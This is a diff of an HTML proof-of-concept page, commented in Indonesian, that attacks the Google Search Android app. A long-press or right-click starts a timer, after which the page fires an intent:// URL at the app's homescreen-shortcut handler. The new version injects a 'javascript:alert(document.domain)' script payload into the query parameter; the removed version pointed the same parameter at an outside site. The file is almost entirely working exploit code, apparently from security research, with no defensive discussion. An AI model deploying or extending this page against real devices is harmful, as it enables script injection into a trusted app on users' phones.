@@ -3,7 +3,7 @@
 <head> 
 <meta charset="UTF-8"> 
 <meta name="viewport" content="width=device-width, initial-scale=1"> 
-<title>Advanced Android Intent PoC</title> 
+<title>Advanced Android Intent XSS PoC</title> 
 <style> 
   body { 
     font-family: system-ui, -apple-system, sans-serif; 
@@ -17,16 +17,16 @@
     align-items: center; 
   } 
   .card {
-    background: #white;
+    background: #ffffff;
     padding: 40px;
     border-radius: 12px;
     box-shadow: 0 4px 15px rgba(0,0,0,0.08);
     text-align: center;
-    max-width: 450px;
+    max-width: 500px;
     width: 90%;
   }
   h2 {
-    color: #1a73e8;
+    color: #d93025;
     margin-top: 0;
   }
   p {
@@ -37,7 +37,7 @@
   a.btn { 
     display: inline-block; 
     padding: 14px 24px; 
-    background: #1a73e8; 
+    background: #d93025; 
     color: white; 
     text-decoration: none; 
     font-weight: 600; 
@@ -45,82 +45,86 @@
     transition: background 0.2s;
   } 
   a.btn:active { 
-    background: #1557b0; 
+    background: #b31412; 
   } 
-  .status {
+  .console-box {
     margin-top: 20px;
-    font-family: monospace;
-    font-size: 12px;
-    color: #137333;
-    background: #e6f4ea;
-    padding: 10px;
+    background: #1e1e1e;
+    color: #00ff66;
+    padding: 12px;
     border-radius: 6px;
-    display: none;
+    font-family: 'Courier New', Courier, monospace;
+    font-size: 12px;
+    text-align: left;
+    height: 100px;
+    overflow-y: auto;
   }
 </style> 
 </head> 
 <body> 
 
 <div class="card">
-    <h2>Android Intent Test</h2>
-    <p>Right-click (desktop) or long-press (mobile) the button below to trigger the delayed intent payload.</p>
+    <h2>Android Intent XSS Vector</h2>
+    <p>Right-click (desktop) or long-press (mobile) the button below to simulate delayed Intent dispatch with script execution payload.</p>
     
-    <a href="https://google.com" id="intentLink" target="_blank"> 
-      Trigger Android Intent 
+    <a href="#" id="intentLink" class="btn"> 
+      Trigger Intent XSS Payload 
     </a> 
 
-    <div id="statusBox" class="status">[STATUS] Ready. Awaiting interaction...</div>
+    <div id="logConsole" class="console-box">[SYSTEM] Initialized. Ready for gesture...</div>
 </div>
 
 <script>
 let triggered = false;
 const link = document.getElementById("intentLink");
-const statusBox = document.getElementById("statusBox");
+const consoleBox = document.getElementById("logConsole");
 
-function updateStatus(msg) {
-    statusBox.style.display = "block";
-    statusBox.textContent = `[STATUS] ${msg}`;
+function log(msg) {
+    const timestamp = new Date().toISOString().split('T')[1].slice(0, 8);
+    consoleBox.innerHTML += `\n[${timestamp}] ${msg}`;
+    consoleBox.scrollTop = consoleBox.scrollHeight;
 }
 
-// Menangkap berbagai varian event pemicu interaksi awal
-['contextmenu', 'auxclick', 'mousedown'].forEach(eventType => {
+// Menangkap event interaksi pemicu (contextmenu / long-press)
+['contextmenu', 'mousedown', 'touchstart'].forEach(eventType => {
     link.addEventListener(eventType, (e) => {
-        // Khusus contextmenu atau klik sekunder/utama yang relevan
-        if (eventType === 'contextmenu' || e.button === 2 || e.button === 0) {
-            if (triggered) {
-                updateStatus("Already triggered, please wait...");
-                return;
-            }
-            triggered = true;
-            updateStatus("Interaction detected. Waiting for delayed execution (4.4s)...");
-
-            setTimeout(() => {
-                updateStatus("Executing intent payload via window.location...");
-                
-                const intentUrl = "intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";
-                
-                // Menggunakan penugasan langsung untuk memicu navigasi intent scheme
-                try {
-                    window.location.href = intentUrl;
-                } catch (err) {
-                    updateStatus(`Error launching intent: ${err.message}`);
-                }
-
-                // Reset state setelah jangka waktu tertentu
-                setTimeout(() => {
-                    triggered = false;
-                    updateStatus("Ready for next trigger.");
-                }, 1500);
-                
-            }, 4400); // Pertahankan timing 4400ms sesuai logika asli Anda
+        // Mencegah navigasi default link kosong
+        e.preventDefault();
+        
+        if (triggered) {
+            log("Already triggered, please wait...");
+            return;
         }
+        triggered = true;
+        log(`Event (${eventType}) detected. Starting timer...`);
+
+        setTimeout(() => {
+            log("Dispatching Android Intent with XSS / script payload...");
+            
+            // Konstruksi Intent URL yang menyertakan payload injeksi / javascript scheme 
+            // atau parameter query yang merefleksikan eksekusi skrip ke target handler.
+            // Contoh payload XSS berbasis parameter query atau direct javascript scheme:
+            const xssPayload = encodeURIComponent("javascript:alert(document.domain)");
+            
+            const intentUrl = `intent://www.google.com/hsi?name=Chrome&query=${xssPayload}&source=homescreen_shortcut#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end`;
+            
+            try {
+                // Eksekusi navigasi intent
+                window.location.href = intentUrl;
+                log("Intent dispatched successfully.");
+            } catch (err) {
+                log(`Dispatch failed: ${err.message}`);
+            }
+
+            // Reset status setelah beberapa detik
+            setTimeout(() => {
+                triggered = false;
+                log("State reset. Ready for next test.");
+            }, 2000);
+            
+        }, 3000); // Penyesuaian delay asinkron (3 detik)
     });
 });
-
-// Penanganan touch event untuk platform mobile
-link.addEventListener("touchstart", () => {
-    updateStatus("Touch start registered.");
-}, { passive: true });
 </script> 
 
 </body> 
